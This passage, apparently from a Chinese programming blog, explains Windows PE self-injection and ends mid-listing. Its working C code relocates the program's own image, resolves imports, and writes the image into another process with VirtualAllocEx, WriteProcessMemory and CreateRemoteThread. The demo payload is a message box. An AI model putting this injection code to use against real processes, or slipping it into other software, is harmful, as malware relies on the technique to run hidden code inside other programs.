<h4 id="修改每个需重定位的地址"><a href="#修改每个需重定位的地址" class="headerlink" title="修改每个需重定位的地址"></a>修改每个需重定位的地址</h4><p>每个16位重定位信息包括低12位的重定位位置和高4位的重定位类型。要得到重定位的RVA,IMAGE_BASE_RELOCATION’的’VirtualAddress’需要加上12位位置偏移量. 类型可以查询MSDN 以一个重定位数据0x34AC为例，其高四位表明了重定位类型为3,即IMAGE_REL_BASED_HIGHLOW，Win32环境下的重定位基本都是这个类型的。 其低12位则表明了相对于VirtualAddress的RVA偏移量。VirtualAddress即需重定位的数据块的起始RVA，再加上这低12位的值就得到了具体的需要进行重定位处理的数据的RVA。 就是说： 要进行重定位处理的数据的RVA=VirtualAddress+RelocData&amp;0x0FFF 函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//完成重定位</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">RelocCode</span><span class="params">(LPBYTE  lpImage, LPBYTE   lpInjectBase)</span> </span></div><div class="line">&#123;</div><div class="line">	DWORD  dwRva = <span class="number">0</span>, dwRvaCount = <span class="number">0</span>, dwRelocOffset = <span class="number">0</span>;</div><div class="line">	LPWORD  lpwOffset = <span class="literal">NULL</span>;</div><div class="line">	PIMAGE\_NT\_HEADERS pNtHeader = <span class="literal">NULL</span>;</div><div class="line">	LPBYTE lpRelocTable;</div><div class="line">	PIMAGE\_BASE\_RELOCATION  pBaseReloc;</div><div class="line"></div><div class="line">	<span class="comment">//获取ntheader</span></div><div class="line">	pNtHeader = (PIMAGE\_NT\_HEADERS)(lpImage + ((PIMAGE\_DOS\_HEADER)lpImage)-&gt;e_lfanew);</div><div class="line">	<span class="comment">//获取重定位表位置</span></div><div class="line">	lpRelocTable = lpImage + pNtHeader-&gt;OptionalHeader.DataDirectory\[<span class="number">5</span>\].VirtualAddress; </div><div class="line">	pBaseReloc = (PIMAGE\_BASE\_RELOCATION)lpRelocTable;</div><div class="line">	<span class="comment">//获取重定位表偏移</span></div><div class="line">	dwRelocOffset = (DWORD)lpInjectBase - pNtHeader-&gt;OptionalHeader.ImageBase; </div><div class="line"></div><div class="line">	<span class="comment">//遍历重定位表，修正需要重定位的代码</span></div><div class="line">	<span class="keyword">while</span> (pBaseReloc-&gt;VirtualAddress != <span class="literal">NULL</span>)</div><div class="line">	&#123;</div><div class="line">		lpwOffset = (WORD*)(lpRelocTable + <span class="keyword">sizeof</span>(IMAGE\_BASE\_RELOCATION));</div><div class="line">		dwRvaCount = (pBaseReloc-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE\_BASE\_RELOCATION)) / <span class="number">2</span>;</div><div class="line"></div><div class="line">		<span class="comment">//循环修正</span></div><div class="line">		<span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; dwRvaCount; i++)</div><div class="line">		&#123;</div><div class="line">			<span class="comment">//获取要修正的RVA</span></div><div class="line">			dwRva = (DWORD)lpImage + (pBaseReloc-&gt;VirtualAddress) + (DWORD)(*lpwOffset &amp; <span class="number">0x0fff</span>);</div><div class="line">			<span class="comment">//RVA加上修正量进行修正</span></div><div class="line">			*(DWORD*)dwRva += dwRelocOffset;</div><div class="line">			lpwOffset++;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//指向下一页重定位信息处</span></div><div class="line">		lpRelocTable += pBaseReloc-&gt;SizeOfBlock;</div><div class="line">		pBaseReloc = (PIMAGE\_BASE\_RELOCATION)lpRelocTable;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="写入AIT表"><a href="#写入AIT表" class="headerlink" title="写入AIT表"></a>写入AIT表</h3><p>实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//用于完成API函数的导入，参数为要插入代码处地址</span></div><div class="line">BOOL CInjectCode::LoadAPI(LPBYTE lpInjectBase)</div><div class="line">&#123;</div><div class="line">	PIMAGE\_DOS\_HEADER pDosHeader = (PIMAGE\_DOS\_HEADER)lpInjectBase;</div><div class="line">	PIMAGE\_NT\_HEADERS pNtHeader = (PIMAGE\_NT\_HEADERS)(lpInjectBase + pDosHeader-&gt;e_lfanew);</div><div class="line">	PIMAGE\_IMPORT\_DESCRIPTOR pImportDescriptor = (PIMAGE\_IMPORT\_DESCRIPTOR)</div><div class="line">		(lpInjectBase + pNtHeader-&gt;OptionalHeader.DataDirectory\[<span class="number">1</span>\].VirtualAddress);</div><div class="line">	<span class="keyword">for</span> (; pImportDescriptor-&gt;OriginalFirstThunk != <span class="number">0</span>; pImportDescriptor++)<span class="comment">//遍历导入表</span></div><div class="line">	&#123;</div><div class="line">		HMODULE hDll = LoadLibraryA((LPCSTR)(lpInjectBase + pImportDescriptor-&gt;Name));</div><div class="line">		<span class="comment">//上面能直接引用LoadLibrary是由于本地和远程进程中该函数地址都是相同的</span></div><div class="line">		<span class="keyword">if</span> (hDll == <span class="literal">NULL</span>)</div><div class="line">			<span class="keyword">return</span> FALSE;</div><div class="line">		PIMAGE\_THUNK\_DATA Origin = (PIMAGE\_THUNK\_DATA)(lpInjectBase + pImportDescriptor-&gt;OriginalFirstThunk);</div><div class="line">		PIMAGE\_THUNK\_DATA First = (PIMAGE\_THUNK\_DATA)(lpInjectBase + pImportDescriptor-&gt;FirstThunk);</div><div class="line">		LPCSTR Name = <span class="literal">NULL</span>;</div><div class="line">		PIMAGE\_IMPORT\_BY\_NAME Import\_name = <span class="literal">NULL</span>;</div><div class="line">		<span class="keyword">for</span> (; Origin-&gt;u1.Ordinal != <span class="number">0</span>; Origin++, First++)</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">if</span> (Origin-&gt;u1.Ordinal &amp; IMAGE\_ORDINAL\_FLAG)</div><div class="line">				Name = (LPCSTR)IMAGE_ORDINAL(Origin-&gt;u1.Ordinal);</div><div class="line">			<span class="keyword">else</span></div><div class="line">			&#123;</div><div class="line">				Import\_name = (PIMAGE\_IMPORT\_BY\_NAME)(lpInjectBase + (DWORD)(Origin-&gt;u1.AddressOfData));</div><div class="line">				Name = (LPCSTR)Import_name-&gt;Name;</div><div class="line">			&#125;</div><div class="line">			First-&gt;u1.Function = (DWORD)GetProcAddress(hDll, Name);</div><div class="line">			<span class="comment">//上面能直接引用GetProcAddress是由于本地和远程进程中该函数地址都是相同的</span></div><div class="line">			<span class="keyword">if</span> (First-&gt;u1.Function == <span class="literal">NULL</span>)</div><div class="line">				<span class="keyword">return</span> FALSE;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="0x03编程实现"><a href="#0x03编程实现" class="headerlink" title="0x03编程实现"></a>0x03编程实现</h1><p>编程的实现，注释的比较详细</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">//完成重定位</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">RelocCode</span><span class="params">(LPBYTE  lpImage, LPBYTE   lpInjectBase)</span> </span></div><div class="line">&#123;</div><div class="line">	DWORD  dwRva = <span class="number">0</span>, dwRvaCount = <span class="number">0</span>, dwRelocOffset = <span class="number">0</span>;</div><div class="line">	LPWORD  lpwOffset = <span class="literal">NULL</span>;</div><div class="line">	PIMAGE\_NT\_HEADERS pNtHeader = <span class="literal">NULL</span>;</div><div class="line">	LPBYTE lpRelocTable;</div><div class="line">	PIMAGE\_BASE\_RELOCATION  pBaseReloc;</div><div class="line"></div><div class="line">	<span class="comment">//获取ntheader</span></div><div class="line">	pNtHeader = (PIMAGE\_NT\_HEADERS)(lpImage + ((PIMAGE\_DOS\_HEADER)lpImage)-&gt;e_lfanew);</div><div class="line">	<span class="comment">//获取重定位表位置</span></div><div class="line">	lpRelocTable = lpImage + pNtHeader-&gt;OptionalHeader.DataDirectory\[<span class="number">5</span>\].VirtualAddress; </div><div class="line">	pBaseReloc = (PIMAGE\_BASE\_RELOCATION)lpRelocTable;</div><div class="line">	<span class="comment">//获取重定位表偏移</span></div><div class="line">	dwRelocOffset = (DWORD)lpInjectBase - pNtHeader-&gt;OptionalHeader.ImageBase; </div><div class="line"></div><div class="line">	<span class="comment">//遍历重定位表，修正需要重定位的代码</span></div><div class="line">	<span class="keyword">while</span> (pBaseReloc-&gt;VirtualAddress != <span class="literal">NULL</span>)</div><div class="line">	&#123;</div><div class="line">		lpwOffset = (WORD*)(lpRelocTable + <span class="keyword">sizeof</span>(IMAGE\_BASE\_RELOCATION));</div><div class="line">		dwRvaCount = (pBaseReloc-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE\_BASE\_RELOCATION)) / <span class="number">2</span>;</div><div class="line"></div><div class="line">		<span class="comment">//循环修正</span></div><div class="line">		<span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; dwRvaCount; i++)</div><div class="line">		&#123;</div><div class="line">			<span class="comment">//获取要修正的RVA</span></div><div class="line">			dwRva = (DWORD)lpImage + (pBaseReloc-&gt;VirtualAddress) + (DWORD)(*lpwOffset &amp; <span class="number">0x0fff</span>);</div><div class="line">			<span class="comment">//RVA加上修正量进行修正</span></div><div class="line">			*(DWORD*)dwRva += dwRelocOffset;</div><div class="line">			lpwOffset++;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//指向下一页重定位信息处</span></div><div class="line">		lpRelocTable += pBaseReloc-&gt;SizeOfBlock;</div><div class="line">		pBaseReloc = (PIMAGE\_BASE\_RELOCATION)lpRelocTable;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//用于完成API函数的导入，参数为要插入代码处地址</span></div><div class="line"><span class="function">BOOL <span class="title">LoadAPI</span><span class="params">(LPBYTE lpInjectBase)</span></span></div><div class="line">&#123;</div><div class="line">	PIMAGE\_DOS\_HEADER pDosHeader = (PIMAGE\_DOS\_HEADER)lpInjectBase;</div><div class="line">	PIMAGE\_NT\_HEADERS pNtHeader = (PIMAGE\_NT\_HEADERS)(lpInjectBase + pDosHeader-&gt;e_lfanew);</div><div class="line">	PIMAGE\_IMPORT\_DESCRIPTOR pImportDescriptor = (PIMAGE\_IMPORT\_DESCRIPTOR)</div><div class="line">		(lpInjectBase + pNtHeader-&gt;OptionalHeader.DataDirectory\[<span class="number">1</span>\].VirtualAddress);</div><div class="line">	<span class="keyword">for</span> (; pImportDescriptor-&gt;OriginalFirstThunk != <span class="number">0</span>; pImportDescriptor++)<span class="comment">//遍历导入表</span></div><div class="line">	&#123;</div><div class="line">		HMODULE hDll = LoadLibraryA((LPCSTR)(lpInjectBase + pImportDescriptor-&gt;Name));</div><div class="line">		<span class="comment">//上面能直接引用LoadLibrary是由于本地和远程进程中该函数地址都是相同的</span></div><div class="line">		<span class="keyword">if</span> (hDll == <span class="literal">NULL</span>)</div><div class="line">			<span class="keyword">return</span> FALSE;</div><div class="line">		PIMAGE\_THUNK\_DATA Origin = (PIMAGE\_THUNK\_DATA)(lpInjectBase + pImportDescriptor-&gt;OriginalFirstThunk);</div><div class="line">		PIMAGE\_THUNK\_DATA First = (PIMAGE\_THUNK\_DATA)(lpInjectBase + pImportDescriptor-&gt;FirstThunk);</div><div class="line">		LPCSTR Name = <span class="literal">NULL</span>;</div><div class="line">		PIMAGE\_IMPORT\_BY\_NAME Import\_name = <span class="literal">NULL</span>;</div><div class="line">		<span class="keyword">for</span> (; Origin-&gt;u1.Ordinal != <span class="number">0</span>; Origin++, First++)</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">if</span> (Origin-&gt;u1.Ordinal &amp; IMAGE\_ORDINAL\_FLAG)</div><div class="line">				Name = (LPCSTR)IMAGE_ORDINAL(Origin-&gt;u1.Ordinal);</div><div class="line">			<span class="keyword">else</span></div><div class="line">			&#123;</div><div class="line">				Import\_name = (PIMAGE\_IMPORT\_BY\_NAME)(lpInjectBase + (DWORD)(Origin-&gt;u1.AddressOfData));</div><div class="line">				Name = (LPCSTR)Import_name-&gt;Name;</div><div class="line">			&#125;</div><div class="line">			First-&gt;u1.Function = (DWORD )GetProcAddress(hDll, Name);</div><div class="line">			<span class="comment">//上面能直接引用GetProcAddress是由于本地和远程进程中该函数地址都是相同的</span></div><div class="line">			<span class="keyword">if</span> (First-&gt;u1.Function == <span class="literal">NULL</span>)</div><div class="line">				<span class="keyword">return</span> FALSE;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//远程要执行的代码，在这里只演示MessageBox</span></div><div class="line"><span class="function">DWORD <span class="title">RemoteThread_Main</span><span class="params">(HINSTANCE hInstance)</span> </span></div><div class="line">&#123;</div><div class="line">	::MessageBox(<span class="number">0</span>, \_T(<span class="string">"远程线程插入成功！"</span>), \_T(<span class="string">"远程线程"</span>), <span class="number">0</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//CreateRemoteThread的线程运行入口</span></div><div class="line"><span class="function">DWORD <span class="title">ThreadEntry</span><span class="params">(LPBYTE  lpImageBase)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span> (LoadAPI(lpImageBase))<span class="comment">//先完成API函数的导入工作</span></div><div class="line">		RemoteThread\_Main((HINSTANCE)lpImageBase);  <span class="comment">//执行函数RemoteThread\_Main中的代码</span></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//注入</span></div><div class="line"><span class="function">BOOL <span class="title">Inject</span><span class="params">(DWORD dwProcessID)</span></span></div><div class="line">&#123;</div><div class="line">	LPBYTE lpNewMoudle = <span class="literal">NULL</span>;</div><div class="line">	HANDLE hRemoteProcess = <span class="literal">NULL</span>;</div><div class="line">	HANDLE hRemoteThread = <span class="literal">NULL</span>;</div><div class="line">	BOOL bRet=TRUE;</div><div class="line"></div><div class="line">	__try</div><div class="line">	&#123;</div><div class="line">		<span class="comment">//获取自身句柄</span></div><div class="line">		LPBYTE lpMoudle = <span class="literal">NULL</span>;</div><div class="line">		lpMoudle = (LPBYTE)GetModuleHandle(<span class="literal">NULL</span>);</div><div class="line">		<span class="keyword">if</span> (lpMoudle == <span class="literal">NULL</span>)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T(<span class="string">"GetModuleHandle failedn"</span>));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//获取NT_HEADER</span></div><div class="line">		PIMAGE\_NT\_HEADERS pNtHeader = <span class="literal">NULL</span>;</div><div class="line">		pNtHeader = (PIMAGE\_NT\_HEADERS)(lpMoudle + ((PIMAGE\_DOS\_HEADER)lpMoudle)-&gt;e_lfanew);</div><div class="line"></div><div class="line">		<span class="comment">//得到自身映像大小</span></div><div class="line">		DWORD dwImageSize;</div><div class="line">		dwImageSize = pNtHeader-&gt;OptionalHeader.SizeOfImage;</div><div class="line"></div><div class="line">		<span class="comment">//在当前空间申请空间存放自身代码</span></div><div class="line">		lpNewMoudle = (LPBYTE)VirtualAlloc(<span class="literal">NULL</span>, dwImageSize, MEM\_COMMIT | MEM\_RESERVE,</div><div class="line">			PAGE\_EXECUTE\_READWRITE);</div><div class="line">		<span class="keyword">if</span> (lpNewMoudle == <span class="literal">NULL</span>)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T(<span class="string">"VirtualAlloc failedn"</span>));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//拷贝自身到buffer</span></div><div class="line">		PIMAGE\_NT\_HEADERS pNewNtHeader = <span class="literal">NULL</span>;</div><div class="line">		memcpy_s(lpNewMoudle, dwImageSize, lpMoudle, dwImageSize);</div><div class="line"></div><div class="line">		<span class="comment">//获取Buffer中NtHeader</span></div><div class="line">		pNewNtHeader = (PIMAGE\_NT\_HEADERS)(lpNewMoudle + ((PIMAGE\_DOS\_HEADER)lpMoudle)-&gt;e_lfanew);</div><div class="line"></div><div class="line">		<span class="comment">//获取远程进程ID</span></div><div class="line">		dwProcessID = <span class="number">1516</span>;</div><div class="line"></div><div class="line">		<span class="comment">//打开远程进程</span></div><div class="line">		hRemoteProcess = OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, dwProcessID);</div><div class="line">		<span class="keyword">if</span> (hRemoteProcess == <span class="literal">NULL</span>)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T(<span class="string">"OpenProcess failedn"</span>));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//在远程进程申请空间</span></div><div class="line">		LPBYTE lpInjectPoint;</div><div class="line">		lpInjectPoint = (LPBYTE)VirtualAllocEx(hRemoteProcess, <span class="number">0</span>, dwImageSize, MEM\_COMMIT, PAGE\_EXECUTE_READWRITE);</div><div class="line">		<span class="keyword">if</span> (lpInjectPoint == <span class="literal">NULL</span>)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T(<span class="string">"VirtualAllocEx failedn"</span>));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//重定位NewMoudle代码</span></div><div class="line">		RelocCode(lpNewMoudle, lpInjectPoint);</div><div class="line"></div><div class="line">		<span class="comment">//得到ThreadEntry在远程进程中的地址</span></div><div class="line">		LPTHREAD\_START\_ROUTINE lpRemoteEntryPoint;</div><div class="line">		LPBYTE lpParam;</div><div class="line">		lpRemoteEntryPoint = (LPTHREAD\_START\_ROUTINE)(lpInjectPoint + (DWORD)&amp;ThreadEntry - lpMoudle);</div><div class="line"></div><div class="line">		<span class="comment">//将插入点地址作为参数传递给线程函数</span></div><div class="line">		lpParam = lpInjectPoint; </div><div class="line"></div><div class="line">		<span class="comment">//将重定位好的代码通过WriteProcessMemory写入远程进程的内存空间中</span></div><div class="line">		<span class="keyword">if</span> (!WriteProcessMemory(hRemoteProcess, lpInjectPoint, lpNewMoudle, dwImageSize, <span class="literal">NULL</span>))</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T(<span class="string">"WriteProcessMemory failedn"</span>));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//通过CreateRemoteThread启动刚写入的代码，参数为Param</span></div><div class="line">		hRemoteThread = CreateRemoteThread(hRemoteProcess, <span class="literal">NULL</span>, <span class="number">0</span>, lpRemoteEntryPoint, lpParam, <span class="number">0</span>, <span class="literal">NULL</span>);</div><div class="line">		<span class="keyword">if</span> (hRemoteThread == <span class="literal">NULL</span>)</div><div class="line">		&#123;</div><div class="line">			OutputDebugString(_T(<span class="string">"CreateRemoteThread failedn"</span>));</div><div class="line">			bRet = FALSE;</div><div class="line">			__leave;</div><div class="line">		&#125;</div><div class="line"></div><div class="line"><span class="comment">// 		//等待线程执行完成</span></div><div class="line"><span class="comment">// 		WaitForSingleObject(hRemoteThread, INFINITE);</span></div><div class="line"><span class="comment">// </span></div><div class="line"><span class="comment">// 		//获取完成返回值</span></div><div class="line"><span class="comment">// 		DWORD dwExitCode;</span></div><div class="line"><span class="comment">// 		if (!GetExitCodeThread(hRemoteThread, &amp;dwExitCode))</span></div><div class="line"><span class="comment">// 		&#123;</span></div><div class="line"><span class="comment">// 			OutputDebugString(_T("GetExitCodeThread failedn"));</span></div><div class="line"><span class="comment">// 			bRet = FALSE;</span></div><div class="line"><span class="comment">// 			__leave;</span></div><div class="line"><span class="comment">//		&#125;</span></div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	__finally</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span> (lpNewMoudle != <span class="literal">NULL</span>)</div><div class="line">		&#123;</div><div class="line">			VirtualFree(lpNewMoudle, <span class="number">0</span>, MEM_RELEASE);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span> (hRemoteProcess != <span class="literal">NULL</span>)</div><div class="line">		&#123;</div><div class="line">			CloseHandle(hRemoteProcess);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> bRet;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="0x04-封装成类"><a href="#0x04-封装成类" class="headerlink" title="0x04 封装成类"></a>0x04 封装成类</h1><p>把整个实现封装成了一个类，方便调用</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div 